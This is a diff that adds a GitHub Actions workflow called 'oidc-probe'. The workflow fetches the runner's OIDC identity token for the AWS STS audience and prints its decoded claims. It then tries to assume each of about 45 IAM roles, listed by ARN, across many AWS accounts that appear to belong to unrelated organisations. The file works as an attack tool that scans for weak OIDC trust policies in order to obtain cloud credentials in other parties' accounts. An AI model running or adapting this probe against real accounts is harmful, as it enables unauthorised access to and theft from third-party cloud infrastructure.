@@ -1,0 +1,69 @@
+name: oidc-probe
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          ARNS: |
+            arn:aws:iam::064493320159:role/deploymentroles/ReleasbilityChecksCICDRoleV2
+            arn:aws:iam::094954420758:role/github-actions-role
+            arn:aws:iam::127489365181:role/github-actions-ecs-deployment-role
+            arn:aws:iam::142366489964:role/GitHubActions-UTA-AI-Advisor-ECR
+            arn:aws:iam::152560469324:role/captain-cli-cd-through-mint
+            arn:aws:iam::197730964718:role/elastic-docs-slack-notifier-invoker
+            arn:aws:iam::202716106225:role/gh-actions-brand-creator
+            arn:aws:iam::240851517002:role/fitness-world-image-publisher
+            arn:aws:iam::247205081690:role/CodeGuruSecurityGitHubAccessRole
+            arn:aws:iam::250283220840:role/CrdSyncRole-Role-1DIOVX0NHGWO4
+            arn:aws:iam::265833082685:role/CDCIDeployRole
+            arn:aws:iam::266735837076:role/githubactions_aws_credentials_role
+            arn:aws:iam::279114543810:role/gha-oidc-NVIDIA
+            arn:aws:iam::286144240398:role/AssumeRoleForGithubUsers
+            arn:aws:iam::308535385114:role/gha_workflow_claude_code
+            arn:aws:iam::342840881361:role/SandboxUser
+            arn:aws:iam::344604240523:role/prd-release-events-reader
+            arn:aws:iam::429214323166:role/github-actions-role
+            arn:aws:iam::516696002612:role/github-actions-ci
+            arn:aws:iam::520831634247:role/CDCIDeployRole
+            arn:aws:iam::540375408222:role/CodePipeline
+            arn:aws:iam::559114230719:role/CDCIDeployRole
+            arn:aws:iam::560285300220:role/CDCIDeployRole
+            arn:aws:iam::598485450821:role/CrdSyncRole-Role-1XCNV8OVL3PMK
+            arn:aws:iam::599525540354:role/Simplebank-DeployRole
+            arn:aws:iam::612297603577:role/davai-plugin
+            arn:aws:iam::637423319757:role/github-actions-claude-bedrock
+            arn:aws:iam::654654285942:role/Github-OIDC
+            arn:aws:iam::702073508373:role/GithubActions
+            arn:aws:iam::702073508373:role/CDCIDeployRole
+            arn:aws:iam::711398986525:role/github-actions-canary-replay-dispatch
+            arn:aws:iam::718277288381:role/llm-saas-dev-gha-ecr
+            arn:aws:iam::746476062914:role/github-actions-ecr
+            arn:aws:iam::749337293305:role/gha_workflow_nightly_build_wheels
+            arn:aws:iam::762254388821:role/java-playground-github-actions-role
+            arn:aws:iam::776241927220:role/GitHubActionsJaseciDeployRole
+            arn:aws:iam::805600764437:role/GitHubSync
+            arn:aws:iam::829297927853:role/GH-Roles-Role-CU27R26U69GE
+            arn:aws:iam::844919361971:role/CDCIDeployRole
+            arn:aws:iam::890664054962:role/upload-playground-artifacts
+            arn:aws:iam::891612574910:role/github-actions
+            arn:aws:iam::896586841071:role/rebar-external-ci-bedrock
+            arn:aws:iam::978222968597:role/JenkinsAccess
+            arn:aws:iam::985879611480:role/github-actions-deploy-role
+            arn:aws:iam::986677156374:role/actions/build/container_pusher
+        run: |
+          set -x
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "tokenlen=${#TOK}"
+          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null; echo
+          while read -r ARN; do
+            [ -z "$ARN" ] && continue
+            echo "=== $ARN ==="
+            aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name ghoprobe --web-identity-token "$TOK" --duration-seconds 900 2>&1 | head -20
+          done <<< "$ARNS"
